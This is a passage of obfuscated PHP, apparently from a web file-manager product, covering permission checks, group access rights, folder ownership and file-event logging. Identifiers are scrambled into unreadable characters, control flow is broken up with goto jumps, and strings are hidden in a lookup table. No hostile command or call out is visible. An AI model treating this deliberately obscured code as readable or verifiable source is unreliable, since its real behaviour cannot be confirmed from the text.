makeSourceAuth($cóÙ¿´’ô§, $f“Äâ„¸µ¤, $B½¦Ç”õÅ¬ = false) { goto aÑ„÷Ä”Ñó; Eì ­†²ãÍ: foreach ($aÀ©¨äí­¤ as $D¬Î“ƒÓ²Œ) { if (!isset($f“Äâ„¸µ¤[$D¬Î“ƒÓ²Œ])) { continue; } $f˜Š…‰ó…º = $this->authMake($f“Äâ„¸µ¤[$D¬Î“ƒÓ²Œ], $B½¦Ç”õÅ¬); if ($f˜Š…‰ó…º[$Dàçù¶ÓÜµ[440]]) { $bƒÑëîî»¨ = $f˜Š…‰ó…º; break; } } if (!$bìœ”­Ã³) { return $bƒÑëîî»¨; } if (!$bƒÑëîî»¨ && $Cœ¿±Ñª») { $bƒÑëîî»¨ = $this->groupAuthInfo($Cœ¿±Ñª», $e„Øò¸æù); } goto cá¾×’ŸÓ©; aí²Îö¯ÛÒ: $aÀ©¨äí­¤ = Model($Dàçù¶ÓÜµ[1180])->parentLevelArray($cóÙ¿´’ô§[$Dàçù¶ÓÜµ[481]]); $aÀ©¨äí­¤ = array_merge(array($cóÙ¿´’ô§[$Dàçù¶ÓÜµ[390]]), array_reverse($aÀ©¨äí­¤)); $bƒÑëîî»¨ = !1; goto Eì ­†²ãÍ; aÑ„÷Ä”Ñó: $Dàçù¶ÓÜµ =& $_SERVER[Š‰]; $E¥°îÔáåğ = $Dàçù¶ÓÜµ[86]; $e„Øò¸æù = $cóÙ¿´’ô§[$Dàçù¶ÓÜµ[478]]; goto Aæ«Ñ‚¸‚¦; cá¾×’ŸÓ©: if (!$bƒÑëîî»¨) { $d›¤ˆ²ËÎ… = Model($Dàçù¶ÓÜµ[480])->getInfo($e„Øò¸æù); $bè’Ç÷¹³ = explode($Dàçù¶ÓÜµ[47], trim($d›¤ˆ²ËÎ…[$Dàçù¶ÓÜµ[481]], $Dàçù¶ÓÜµ[47])); $bè’Ç÷¹³ = array_reverse($bè’Ç÷¹³); foreach ($bè’Ç÷¹³ as $Bàò„—¥î’) { if ($Bàò„—¥î’ == $Dàçù¶ÓÜµ[491] || $Bàò„—¥î’ == $E¥°îÔáåğ) { continue; } $F‘‘¤Ûƒ‘ = $this->groupRootAuth($Bàò„—¥î’, $B½¦Ç”õÅ¬); if (!$F‘‘¤Ûƒ‘) { continue; } $bƒÑëîî»¨ = $this->groupAuthInfo($F‘‘¤Ûƒ‘, $Bàò„—¥î’); break; } } if (!$bƒÑëîî»¨ || $bƒÑëîî»¨[$Dàçù¶ÓÜµ[401]] <= 0) { $EŠÔËˆ´ÕÇ = $this->authDeepCheck($cóÙ¿´’ô§[$Dàçù¶ÓÜµ[390]], $B½¦Ç”õÅ¬); if ($EŠÔËˆ´ÕÇ) { $bƒÑëîî»¨ = $EŠÔËˆ´ÕÇ; } } return $bƒÑëîî»¨; goto bÉ¥ºÌ‹õ‰; Aæ«Ñ‚¸‚¦: $bìœ”­Ã³ = $cóÙ¿´’ô§[$Dàçù¶ÓÜµ[398]] == SourceModel::TYPE_GROUP; $Cœ¿±Ñª» = $bìœ”­Ã³ ? $this->groupRootAuth($e„Øò¸æù, $B½¦Ç”õÅ¬) : !1; if ($Cœ¿±Ñª» && Model($Dàçù¶ÓÜµ[1831])->authCheckAction($Cœ¿±Ñª»[$Dàçù¶ÓÜµ[400]], $Dàçù¶ÓÜµ[1683])) { return $this->groupAuthInfo($Cœ¿±Ñª», $e„Øò¸æù); } goto aí²Îö¯ÛÒ; bÉ¥ºÌ‹õ‰: } private function userIsRoot($bÚóœêê˜ = false) { $b¡ª®ñßÃĞ =& $_SERVER[Š‰]; if (!$bÚóœêê˜ && _get($GLOBALS, $b¡ª®ñßÃĞ[479])) { return !0; } $DİŞêëëÈ = Model($b¡ª®ñßÃĞ[501])->getInfo($bÚóœêê˜); $Bí±›…À£Œ = Model($b¡ª®ñßÃĞ[1852])->listData($DİŞêëëÈ[$b¡ª®ñßÃĞ[1384]]); if ($Bí±›…À£Œ && $Bí±›…À£Œ[$b¡ª®ñßÃĞ[1256]][$b¡ª®ñßÃĞ[1853]] == 1) { return !0; } return !1; } private function sourceAuthInfo($EŒØ ‘º¾É) { goto AÍÎ­ÊÖ„¿; f¡³Õ‚®µ­: if (!$c¥¢µ¼îÇÂ) { return !1; } $E•ªßàˆÌ²->groupPathDisplay($c¥¢µ¼îÇÂ); $F‰–ôÛÒ˜¡ = array($c¥¢µ¼îÇÂ); goto AÑ×š¥Ø‹; e÷ŸëÖ×Ä„: if (isset($c¥¢µ¼îÇÂ[$cÜÌõ†¶ˆ”[486]])) { $FõˆÜÑË— = explode($cÜÌõ†¶ˆ”[8], trim($c¥¢µ¼îÇÂ[$cÜÌõ†¶ˆ”[489]], $cÜÌõ†¶ˆ”[8])); array_shift($FõˆÜÑË—); $a˜í—Ê¢¡ = $c¥¢µ¼îÇÂ[$cÜÌõ†¶ˆ”[484]] . $cÜÌõ†¶ˆ”[1854] . implode($cÜÌõ†¶ˆ”[8], $FõˆÜÑË—); } return array($cÜÌõ†¶ˆ”[407] => $c¥¢µ¼îÇÂ[$cÜÌõ†¶ˆ”[28]], $cÜÌõ†¶ˆ”[75] => KodIO::make($c¥¢µ¼îÇÂ[$cÜÌõ†¶ˆ”[390]]), $cÜÌõ†¶ˆ”[1855] => $a˜í—Ê¢¡); goto d¢Ãİ•èğ”; AÑ×š¥Ø‹: $F‰–ôÛÒ˜¡ = $E•ªßàˆÌ²->_listAppendPath($F‰–ôÛÒ˜¡); $c¥¢µ¼îÇÂ = $F‰–ôÛÒ˜¡[0]; $a˜í—Ê¢¡ = $c¥¢µ¼îÇÂ[$cÜÌõ†¶ˆ”[489]]; goto e÷ŸëÖ×Ä„; AÍÎ­ÊÖ„¿: $cÜÌõ†¶ˆ” =& $_SERVER[Š‰]; $E•ªßàˆÌ² = Model($cÜÌõ†¶ˆ”[1180]); $c¥¢µ¼îÇÂ = $E•ªßàˆÌ²->sourceInfo($EŒØ ‘º¾É); goto f¡³Õ‚®µ­; d¢Ãİ•èğ”: } private function groupAuthInfo($BŠŠëïÌŒ, $F³Şèø­¶®) { $AĞŒ¹²•Ô… =& $_SERVER[Š‰]; $D«É£Ò“´ = Model($AĞŒ¹²•Ô…[480])->getInfo($F³Şèø­¶®); return array($AĞŒ¹²•Ô…[1856] => intval($BŠŠëïÌŒ[$AĞŒ¹²•Ô…[400]]), $AĞŒ¹²•Ô…[1840] => $BŠŠëïÌŒ, $AĞŒ¹²•Ô…[1857] => LNG($AĞŒ¹²•Ô…[1858]), $AĞŒ¹²•Ô…[1849] => array($AĞŒ¹²•Ô…[407] => $D«É£Ò“´[$AĞŒ¹²•Ô…[28]], $AĞŒ¹²•Ô…[75] => KodIO::make($D«É£Ò“´[$AĞŒ¹²•Ô…[84]][$AĞŒ¹²•Ô…[390]]), $AĞŒ¹²•Ô…[1855] => $D«É£Ò“´[$AĞŒ¹²•Ô…[485]])); } protected function groupRootAuth($CÇİšéÉª‚, $BÃòãöÜ—å = false) { goto aè·­Ğ—¦´; CœÈªâªË: $EÁÊ¯”™ÊŒ = $this->sourceAuthSelect($dÊÜòêºí[$aˆ‘™ÙÜÄó[84]][$aˆ‘™ÙÜÄó[390]]); $a¹ƒµŸğ„ = $EÁÊ¯”™ÊŒ ? $this->authMake($EÁÊ¯”™ÊŒ, $BÃòãöÜ—å) : !1; $E ™‘ËŸÄ« = $a¹ƒµŸğ„ ? $a¹ƒµŸğ„[$aˆ‘™ÙÜÄó[440]] : !1; goto DÇÒŒ·ÖÉ; DÇÒŒ·ÖÉ: $cÍõŒ§—Şä[$fãÖˆ‰Í›¿] = $E ™‘ËŸÄ« ? $E ™‘ËŸÄ« : $F’‹…Õ‘“¨; return $cÍõŒ§—Şä[$fãÖˆ‰Í›¿]; goto dğº—À×º°; bëêÇ¤Úô¿: $a¸°µš’Âù = $this->userGroupList($BÃòãöÜ—å); $F’‹…Õ‘“¨ = isset($a¸°µš’Âù[$CÇİšéÉª‚]) ? $a¸°µš’Âù[$CÇİšéÉª‚][$aˆ‘™ÙÜÄó[400]] : !1; if ($F’‹…Õ‘“¨ && Model($aˆ‘™ÙÜÄó[1831])->authCheckAction($F’‹…Õ‘“¨[$aˆ‘™ÙÜÄó[400]], $aˆ‘™ÙÜÄó[1683])) { $cÍõŒ§—Şä[$fãÖˆ‰Í›¿] = $F’‹…Õ‘“¨; return $F’‹…Õ‘“¨; } goto CœÈªâªË; FÚœĞñ©’»: static $cÍõŒ§—Şä = array(); if (isset($cÍõŒ§—Şä[$fãÖˆ‰Í›¿])) { return $cÍõŒ§—Şä[$fãÖˆ‰Í›¿]; } $dÊÜòêºí = Model($aˆ‘™ÙÜÄó[480])->getInfo($CÇİšéÉª‚); goto bëêÇ¤Úô¿; aè·­Ğ—¦´: $aˆ‘™ÙÜÄó =& $_SERVER[Š‰]; $BÃòãöÜ—å = $BÃòãöÜ—å ? $BÃòãöÜ—å : USER_ID; $fãÖˆ‰Í›¿ = $BÃòãöÜ—å . $aˆ‘™ÙÜÄó[1859] . $CÇİšéÉª‚; goto FÚœĞñ©’»; dğº—À×º°: } public function authOwnerApply($cŠóõ’ò‹) { goto fèßôØÂÖÀ; Fñ ¼ã†ˆÑ: $cŠóõ’ò‹[$bØíŸ’†ƒ[400]][$bØíŸ’†ƒ[1862]] = Model($bØíŸ’†ƒ[497])->userListInfo($D‘¬™³‚Å¢); return $cŠóõ’ò‹; goto Có¤„”µë†; C÷˜ ©ÍÉÜ: $eÖøŠ³ˆª§ = Model($bØíŸ’†ƒ[1180])->parentLevelArray($cŠóõ’ò‹[$bØíŸ’†ƒ[481]]); $eÖøŠ³ˆª§ = array_merge(array($cŠóõ’ò‹[$bØíŸ’†ƒ[390]]), array_reverse($eÖøŠ³ˆª§)); $fµóË•¥æ« = $this->sourceAuthSelect($eÖøŠ³ˆª§); goto DÔÌÊ¢Û¡§; fèßôØÂÖÀ: $bØíŸ’†ƒ =& $_SERVER[Š‰]; if (empty($cŠóõ’ò‹[$bØíŸ’†ƒ[400]]) || isset($cŠóõ’ò‹[$bØíŸ’†ƒ[1860]]) && $cŠóõ’ò‹[$bØíŸ’†ƒ[1860]]) { return $cŠóõ’ò‹; } if (AuthModel::authCheckRoot($cŠóõ’ò‹[$bØíŸ’†ƒ[400]][$bØíŸ’†ƒ[401]])) { return $cŠóõ’ò‹; } goto C÷˜ ©ÍÉÜ; DÔÌÊ¢Û¡§: $aï¦•óÖÚŒ = array(); $D‘¬™³‚Å¢ = array(); foreach ($fµóË•¥æ« as $FË’±à›À => $dóºÌõ¿É) { $E¶…á¿ºÔĞ = $this->authFolderOwnerUser($dóºÌõ¿É); $aï¦•óÖÚŒ[$FË’±à›À] = $E¶…á¿ºÔĞ; $D‘¬™³‚Å¢ = array_merge($D‘¬™³‚Å¢, $E¶…á¿ºÔĞ[$bØíŸ’†ƒ[557]]); if ($E¶…á¿ºÔĞ[$bØíŸ’†ƒ[1861]]) { break; } } goto b‘ŞÙ ƒÛ¥; b‘ŞÙ ƒÛ¥: if (count($D‘¬™³‚Å¢) == 0) { $D‘¬™³‚Å¢ = $this->authFolderOwnerGroup($cŠóõ’ò‹[$bØíŸ’†ƒ[478]]); } $D‘¬™³‚Å¢ = array_unique($D‘¬™³‚Å¢); if (AuthModel::authCheckRoot($cŠóõ’ò‹[$bØíŸ’†ƒ[400]][$bØíŸ’†ƒ[401]])) { $D‘¬™³‚Å¢[] = USER_ID; } goto Fñ ¼ã†ˆÑ; Có¤„”µë†: } private function authFolderOwnerGroup($DÛ‹æ’ñƒÇ) { $c•Ï·µ­ =& $_SERVER[Š‰]; $B¯•³§òµá = Model($c•Ï·µ­[1745])->where(array($c•Ï·µ­[1663] => $DÛ‹æ’ñƒÇ))->select(); $aï—©¼Ÿ¯× = array(); if (!$B¯•³§òµá) { return $aï—©¼Ÿ¯×; } foreach ($B¯•³§òµá as $fÕñêî©¿œ) { $f›£†Èê·š = $this->authInfo($fÕñêî©¿œ); if (AuthModel::authCheckRoot($f›£†Èê·š[$c•Ï·µ­[400]])) { $aï—©¼Ÿ¯×[] = $fÕñêî©¿œ[$c•Ï·µ­[1500]]; } } return $aï—©¼Ÿ¯×; } private function authFolderOwnerUser($FŞà³Î™‡À) { $AîÀ²²¾â =& $_SERVER[Š‰]; $CŒîªÑÇØ = array(); $fÓ‹ºÁ¼ó = !1; foreach ($FŞà³Î™‡À as $B¦óÀŒµªĞ) { $CÍä¿÷¯Æ§ = $this->authInfo($B¦óÀŒµªĞ); if ($B¦óÀŒµªĞ[$AîÀ²²¾â[478]] == $AîÀ²²¾â[491]) { $fÓ‹ºÁ¼ó = !0; } if ($B¦óÀŒµªĞ[$AîÀ²²¾â[398]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($CÍä¿÷¯Æ§[$AîÀ²²¾â[400]])) { $CŒîªÑÇØ[] = $B¦óÀŒµªĞ[$AîÀ²²¾â[478]]; } } } return array($AîÀ²²¾â[557] => $CŒîªÑÇØ, $AîÀ²²¾â[1861] => $fÓ‹ºÁ¼ó); } public function authMake($c•„¡…š›î, $Bšâ¨¯„Æ… = false) { $D·Œ½ĞÑ =& $_SERVER[Š‰]; $EÜğ£ì£ñà = $this->authArrayCheck($c•„¡…š›î, $Bšâ¨¯„Æ…); if ($EÜğ£ì£ñà[$D·Œ½ĞÑ[1863]]) { $EÜğ£ì£ñà[$D·Œ½ĞÑ[1863]] = $this->sourceAuthInfo($EÜğ£ì£ñà[$D·Œ½ĞÑ[1863]]); } return $EÜğ£ì£ñà; } public function authArrayCheck($d‚–Œ¥Ûç, $cÁ–êµ‰Öó = false) { goto f¬ÍŒÆ‡¨Å; eã”Ñ¸±ì: $B•åªƒ«¡÷ = 0; $BçâÁ¦«ÒÀ = 0; $d¹êÀ“Ã–Ê = 0; goto e¨ğ–Œ½­; c‹†Š¨ˆÇø: foreach ($d‚–Œ¥Ûç as $aÆáíêöÔœ) { $cÂ•×ÚÅšª = $this->authInfo($aÆáíêöÔœ); if (!$cÂ•×ÚÅšª) { continue; } $d™¥‘œ£ï¾ = $aÆáíêöÔœ[$d‚àâ±Çº[478]]; $bõˆğ†œÂî = intval($cÂ•×ÚÅšª[$d‚àâ±Çº[400]]); if ($aÆáíêöÔœ[$d‚àâ±Çº[398]] == SourceModel::TYPE_USER && $d™¥‘œ£ï¾ == $cÁ–êµ‰Öó) { $B•åªƒ«¡÷ = !0; $d¹êÀ“Ã–Ê = $cÂ•×ÚÅšª; $BçâÁ¦«ÒÀ = $bõˆğ†œÂî; } else { if ($aÆáíêöÔœ[$d‚àâ±Çº[398]] == SourceModel::TYPE_GROUP && $this->groupContainUser($d™¥‘œ£ï¾, $cÁ–êµ‰Öó)) { $d¼ìëÖˆâ‹ = !0; $e‰ÚÍòØùÈ = $this->groupStepToUserGroup($d™¥‘œ£ï¾, $cÁ–êµ‰Öó); if ($e‰ÚÍòØùÈ < $A§ëÉÕˆ¶É) { $A§ëÉÕˆ¶É = $e‰ÚÍòØùÈ; $a¹á¸Š´ªŒ = $bõˆğ†œÂî; $cÕÏÌ¥ = $cÂ•×ÚÅšª; $Féí´ïï² = $d™¥‘œ£ï¾; } if ($e‰ÚÍòØùÈ == $A§ëÉÕˆ¶É && $bõˆğ†œÂî >= $a¹á¸Š´ªŒ) { $a¹á¸Š´ªŒ = $bõˆğ†œÂî; $cÕÏÌ¥ = $cÂ•×ÚÅšª; $Féí´ïï² = $d™¥‘œ£ï¾; } } else { if ($d™¥‘œ£ï¾ == $d‚àâ±Çº[491]) { $A™±ááïİ = !0; $eèÔ²Çğ«› = $cÂ•×ÚÅšª; $f¦Ôºß˜ = $bõˆğ†œÂî; } } } } if ($B•åªƒ«¡÷) { $F¿¯¯­„ÔŞ = $BçâÁ¦«ÒÀ; $cÂ•×ÚÅšª = $d¹êÀ“Ã–Ê; $Eç²ï¾­—° = LNG($d‚àâ±Çº[1864]); } else { if ($d¼ìëÖˆâ‹) { $F¿¯¯­„ÔŞ = $a¹á¸Š´ªŒ; $cÂ•×ÚÅšª = $cÕÏÌ¥; $cÍîÉ¯ßïÃ = Model($d‚àâ±Çº[480])->getInfo($Féí´ïï²); $Eç²ï¾­—° = $d‚àâ±Çº[159] . $cÍîÉ¯ßïÃ[$d‚àâ±Çº[485]] . $d‚àâ±Çº[1865] . LNG($d‚àâ±Çº[1866]); } else { if ($A™±ááïİ) { $F¿¯¯­„ÔŞ = $f¦Ôºß˜; $cÂ•×ÚÅšª = $eèÔ²Çğ«›; $Eç²ï¾­—° = LNG($d‚àâ±Çº[1837]); } else { $F¿¯¯­„ÔŞ = 0; $cÂ•×ÚÅšª = !1; $Eç²ï¾­—° = $d‚àâ±Çº[33]; } } } $c¸‘Ìõ£ºÇ = array($d‚àâ±Çº[1856] => intval($F¿¯¯­„ÔŞ), $d‚àâ±Çº[1840] => $cÂ•×ÚÅšª, $d‚àâ±Çº[1857] => $Eç²ï¾­—°, $d‚àâ±Çº[1849] => $aÆáíêöÔœ[$d‚àâ±Çº[390]]); goto dùÉ‰¦à‚†; f¬ÍŒÆ‡¨Å: $d‚àâ±Çº =& $_SERVER[Š‰]; if (!$d‚–Œ¥Ûç) { return array($d‚àâ±Çº[401] => 0, $d‚àâ±Çº[440] => !1); } $cÁ–êµ‰Öó = $cÁ–êµ‰Öó ? $cÁ–êµ‰Öó : USER_ID; goto eã”Ñ¸±ì; dùÉ‰¦à‚†: return $c¸‘Ìõ£ºÇ; goto e¼±ÆªĞ§ä; e¨ğ–Œ½­: $d¼ìëÖˆâ‹ = 0; $a¹á¸Š´ªŒ = 0; $cÕÏÌ¥ = 0; goto D¯Àµ«¬•ä; D¯Àµ«¬•ä: $A§ëÉÕˆ¶É = 1000; $Féí´ïï² = 0; $A™±ááïİ = 0; goto A×”ò„‘; A×”ò„‘: $f¦Ôºß˜ = 0; $eèÔ²Çğ«› = 0; $aÆáíêöÔœ = array($d‚àâ±Çº[390] => 0); goto c‹†Š¨ˆÇø; e¼±ÆªĞ§ä: } private function groupContainUser($c˜ÀÃö÷Æ›, $Fã¦ÇÚ…Ã = false) { return in_array($c˜ÀÃö÷Æ›, $this->userGroupParents($Fã¦ÇÚ…Ã)); } private function groupStepToUserGroup($BìÆõÊØÛÛ, $A¾²”¿ô’Â = false) { goto AŸÅ¾ñâç; E«â†ÔôÙ¡: $bÍ¬²Õ“ = $GLOBALS[$c÷¸Î‰àÈª[6]][$c÷¸Î‰àÈª[87]][$c÷¸Î‰àÈª[1756]] == 1; $eÎÇœİƒ— = $bÍ¬²Õ“ ? 3 : 2; foreach ($AŸ¯œÉ as $d§¶Ÿ¸åĞ) { if ($d§¶Ÿ¸åĞ[$c÷¸Î‰àÈª[1663]] == $BìÆõÊØÛÛ) { return 0; } $AƒğÄ‰óˆ‡ = explode($c÷¸Î‰àÈª[47], trim($d§¶Ÿ¸åĞ[$c÷¸Î‰àÈª[481]], $c÷¸Î‰àÈª[47])); if ($AƒğÄ‰óˆ‡[0] == $c÷¸Î‰àÈª[491] && count($AƒğÄ‰óˆ‡) > $eÎÇœİƒ—) { $E™²…ëŸ = array_reverse(array_slice($AƒğÄ‰óˆ‡, $eÎÇœİƒ—)); $B§Ú™ ÁÖ¨ = array_search($BìÆõÊØÛÛ, $E™²…ëŸ); if ($B§Ú™ ÁÖ¨ !== !1 && $B§Ú™ ÁÖ¨ + 1 <= $Dõó×’ëçÆ) { $Dõó×’ëçÆ = $B§Ú™ ÁÖ¨ + 1; } } } goto bêù¹ÙŒ; AŸÅ¾ñâç: $c÷¸Î‰àÈª =& $_SERVER[Š‰]; $AŸ¯œÉ = $this->userGroupList($A¾²”¿ô’Â); $Dõó×’ëçÆ = 1000; goto E«â†ÔôÙ¡; bêù¹ÙŒ: return $Dõó×’ëçÆ; goto EÜ×æ‹ä´’; EÜ×æ‹ä´’: } private function userGroupList($D•ÚÑ–ó… = false) { $a›ÎÁà†¬‘ =& $_SERVER[Š‰]; static $aÜ¨­½ñôĞ = array(); if (isset($aÜ¨­½ñôĞ[$D•ÚÑ–ó…])) { return $aÜ¨­½ñôĞ[$D•ÚÑ–ó…]; } $c…÷È…«– = Model($a›ÎÁà†¬‘[501])->getInfo($D•ÚÑ–ó…); $aÜ¨­½ñôĞ[$D•ÚÑ–ó…] = array_to_keyvalue($c…÷È…«–[$a›ÎÁà†¬‘[1838]], $a›ÎÁà†¬‘[1663]); return $aÜ¨­½ñôĞ[$D•ÚÑ–ó…]; } public function userGroupParents($DùÚïì‚Ëø) { goto FÇƒ¾¹œ…Ñ; f±ÜºÌ‹¢: $aùİöéğ³Ú[$DùÚïì‚Ëø] = array_unique($Fˆß„äÑíù); return $aùİöéğ³Ú[$DùÚïì‚Ëø]; goto A¿–º‰‘´; Câ¯†“«é: if (isset($aùİöéğ³Ú[$DùÚïì‚Ëø])) { return $aùİöéğ³Ú[$DùÚïì‚Ëø]; } $eÎŒµÓ•ƒ = $this->userGroupList($DùÚïì‚Ëø); $Fˆß„äÑíù = array(); goto BÆÕ§İåøŠ; FÇƒ¾¹œ…Ñ: $dƒ”—åË¸¢ =& $_SERVER[Š‰]; static $aùİöéğ³Ú = array(); $DùÚïì‚Ëø = $DùÚïì‚Ëø ? $DùÚïì‚Ëø : USER_ID; goto Câ¯†“«é; BÆÕ§İåøŠ: $A®õÀœòµ = $GLOBALS[$dƒ”—åË¸¢[6]][$dƒ”—åË¸¢[87]][$dƒ”—åË¸¢[1756]] == 1; $aÂï»àó = $A®õÀœòµ ? 3 : 2; foreach ($eÎŒµÓ•ƒ as $cçÎ‚ÚÍ¿°) { $BŠ§‚êŒóè = array($cçÎ‚ÚÍ¿°[$dƒ”—åË¸¢[1663]]); $fµ ‡å­Ñ‚ = explode($dƒ”—åË¸¢[47], trim($cçÎ‚ÚÍ¿°[$dƒ”—åË¸¢[481]], $dƒ”—åË¸¢[47])); if ($fµ ‡å­Ñ‚[0] == $dƒ”—åË¸¢[491] && count($fµ ‡å­Ñ‚) > $aÂï»àó) { $bÖ¡­Ø“ = array_slice($fµ ‡å­Ñ‚, $aÂï»àó); $BŠ§‚êŒóè = array_merge($BŠ§‚êŒóè, array_reverse($bÖ¡­Ø“)); } $Fˆß„äÑíù = array_merge($Fˆß„äÑíù, $BŠ§‚êŒóè); } goto f±ÜºÌ‹¢; A¿–º‰‘´: } public function authTargetInfoMake($bĞ—²‚Áø) { goto AöÀËÒ·ë¸; AöÀËÒ·ë¸: $aª¡Ç™¡ÏÈ =& $_SERVER[Š‰]; $Bœ¶¯˜ƒë = array(); $eÎá¡Ù™‰¼ = array(); goto e–Ê¸±ƒõ‰; eÀà¹Ğ îš: return array($aª¡Ç™¡ÏÈ[1868] => $Bœ¶¯˜ƒë, $aª¡Ç™¡ÏÈ[1869] => $eÎá¡Ù™‰¼); goto cİõô±ŒÃ; e–Ê¸±ƒõ‰: foreach ($bĞ—²‚Áø as $BÕ‘¶È‰¾Š) { if ($BÕ‘¶È‰¾Š[$aª¡Ç™¡ÏÈ[398]] == SourceModel::TYPE_USER) { $Bœ¶¯˜ƒë[] = intval($BÕ‘¶È‰¾Š[$aª¡Ç™¡ÏÈ[478]]); } else { if ($BÕ‘¶È‰¾Š[$aª¡Ç™¡ÏÈ[398]] == SourceModel::TYPE_GROUP) { $eÎá¡Ù™‰¼[] = intval($BÕ‘¶È‰¾Š[$aª¡Ç™¡ÏÈ[478]]); } } } if ($Bœ¶¯˜ƒë) { $Bœ¶¯˜ƒë = Model($aª¡Ç™¡ÏÈ[497])->userListInfo($Bœ¶¯˜ƒë); } if ($eÎá¡Ù™‰¼) { $BßÑ¤¬ğ•® = array($aª¡Ç™¡ÏÈ[1742] => array($aª¡Ç™¡ÏÈ[405], $eÎá¡Ù™‰¼)); $eÎá¡Ù™‰¼ = Model($aª¡Ç™¡ÏÈ[480])->field($aª¡Ç™¡ÏÈ[1867])->where($BßÑ¤¬ğ•®)->select(); $eÎá¡Ù™‰¼ = array_to_keyvalue($eÎá¡Ù™‰¼, $aª¡Ç™¡ÏÈ[1663]); } goto eÀà¹Ğ îš; cİõô±ŒÃ: } public function authInfo($F‹…¤¯ê’) { $bŠÄŞˆš»ò =& $_SERVER[Š‰]; if ($F‹…¤¯ê’[$bŠÄŞˆš»ò[1759]]) { $d¿‹Ÿ»Ö‡å = Model($bŠÄŞˆš»ò[1831])->listData($F‹…¤¯ê’[$bŠÄŞˆš»ò[1759]]); if (!$d¿‹Ÿ»Ö‡å) { return !1; $BóÅŸØôø¦ = Model($bŠÄŞˆš»ò[1831])->listData(); $Aë¯²çÆ—— = array_filter_by_field($BóÅŸØôø¦, $bŠÄŞˆš»ò[400], $bŠÄŞˆš»ò[491]); return $Aë¯²çÆ——; } $fè¥Ñœ¸Ô¢ = array_field_key($d¿‹Ÿ»Ö‡å, array($bŠÄŞˆš»ò[388], $bŠÄŞˆš»ò[28], $bŠÄŞˆš»ò[400], $bŠÄŞˆš»ò[1684], $bŠÄŞˆš»ò[1686])); $fè¥Ñœ¸Ô¢[$bŠÄŞˆš»ò[1870]] = $F‹…¤¯ê’; return $fè¥Ñœ¸Ô¢; } else { return array($bŠÄŞˆš»ò[406] => 0, $bŠÄŞˆš»ò[1669] => $F‹…¤¯ê’[$bŠÄŞˆš»ò[1813]], $bŠÄŞˆš»ò[407] => $bŠÄŞˆš»ò[33], $bŠÄŞˆš»ò[1684] => $bŠÄŞˆš»ò[1871]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\x75\x72\x63\x65\x5f\x65\166\x65\156\164"; protected $dataAuto = array(array("\x63\x72\145\141\x74\145\124\x69\x6d\145", "\164\151\155\x65", "\x69\156\163\145\162\164", "\x66\x75\156\143\164\x69\157\156"), array("\144\145\163\x63", '', "\151\x6e\x73\x65\x72\x74\x2c\165\x70\x64\141\x74\145\x2c\x73\145\154\145\x63\x74", "\152\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($aÏ‰‰‰ ‘Ÿ, $B©ÈÂ§â»ì, $e„‡øáÔõæ = '') { goto e·ßšøãÔì; e·ßšøãÔì: $E‰Òí¡¿Á÷ =& $_SERVER[Š‰]; if (!$this->eventSave) { return; } $BŞ´Ü´Å†ë = Model($E‰Òí¡¿Á÷[1180])->sourceInfo($aÏ‰‰‰ ‘Ÿ); goto D¬ˆ°÷Öí¢; D¬ˆ°÷Öí¢: if (!$BŞ´Ü´Å†ë) { return !1; } if ($this->isCacheEvent($BŞ´Ü´Å†ë, $B©ÈÂ§â»ì)) { return; } if ($e„‡øáÔõæ && is_string($e„‡øáÔõæ)) { $e„‡øáÔõæ = array($E‰Òí¡¿Á÷[1696] => $e„‡øáÔõæ); } goto eÍØ’ÇÈ¬; eÍØ’ÇÈ¬: $FÚßŠÙÛƒ = array($E‰Òí¡¿Á÷[404] => $aÏ‰‰‰ ‘Ÿ, $E‰Òí¡¿Á÷[1872] => $BŞ´Ü´Å†ë[$E‰Òí¡¿Á÷[472]], $E‰Òí¡¿Á÷[1873] => $BŞ´Ü´Å†ë[$E‰Òí¡¿Á÷[28]], $E‰Òí¡¿Á÷[489] => $BŞ´Ü´Å†ë[$E‰Òí¡¿Á÷[489]], $E‰Òí¡¿Á÷[1492] => USER_ID, $E‰Òí¡¿Á÷[409] => $B©ÈÂ§â»ì, $E‰Òí¡¿Á÷[1494] => $e„‡øáÔõæ); $this->addSystemLog($B©ÈÂ§â»ì, $FÚßŠÙÛƒ); return $this->add($FÚßŠÙÛƒ); goto d‚¶Êîõó; d‚¶Êîõó: } private function addSystemLog($bˆ…åÊ™Õ«, $EƒÎ˜’‹œ) { $a¦±àî¿À¬ =& $_SERVER[Š‰]; if ($bˆ…åÊ™Õ« == $a¦±àî¿À¬[1874]) { $bˆ…åÊ™Õ« = $EƒÎ˜’‹œ[$a¦±àî¿À¬[425]][$a¦±àî¿À¬[1875]]; } else { if (in_array($bˆ…åÊ™Õ«, array($a¦±àî¿À¬[1640], $a¦±àî¿À¬[1876]))) { $bˆ…åÊ™Õ« = $EƒÎ˜’‹œ[$a¦±àî¿À¬[425]][$a¦±àî¿À¬[705]]; } } $eõ‹ÏŒ³ˆ® = array_merge($EƒÎ˜’‹œ, array($a¦±àî¿À¬[1877] => $EƒÎ˜’‹œ[$a¦±àî¿À¬[390]], $a¦±àî¿À¬[1878] => $EƒÎ˜’‹œ[$a¦±àî¿À¬[1878]])); Model($a¦±àî¿À¬[1604])->addLog($a¦±àî¿À¬[1879] . $bˆ…åÊ™Õ«, $eõ‹ÏŒ³ˆ®); } private function isCacheEvent($Fí†Û¡ÌÜ, $BÆÇõÄº»‹) { if ($Fí†Û¡ÌÜ[$_SERVER[Š‰][398]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($FˆŸŞØ‚¤, $A™ÈÃ®§Æ…) { $BöâË„œŠ =& $_SERVER[Š‰]; $bçáñÌ’ìñ = Model($BöâË„œŠ[1180])->sourceInfo($FˆŸŞØ‚¤); $Aİ¿Ûë–à = array($BöâË„œŠ[1875] => $A™ÈÃ®§Æ…, $BöâË„œŠ[28] => $bçáñÌ’ìñ[$BöâË„œŠ[28]]); return $this->addEvent($FˆŸŞØ‚¤, $BöâË„œŠ[1874], $Aİ¿Ûë–à); } public function eventFileEdit($fÁ Ù¡åŠ) { $fµÆõ¢ ßË =& $_SERVER[Š‰]; $BŒÎ¼îó = array($fµÆõ¢ ßË[1880] => $_SERVER[$fµÆõ¢ ßË[1881]], $fµÆõ¢ ßË[1882] => strtolower(ACTION)); return $this->addEvent($fÁ Ù¡åŠ, $fµÆõ¢ ßË[1630], $BŒÎ¼îó); } public function 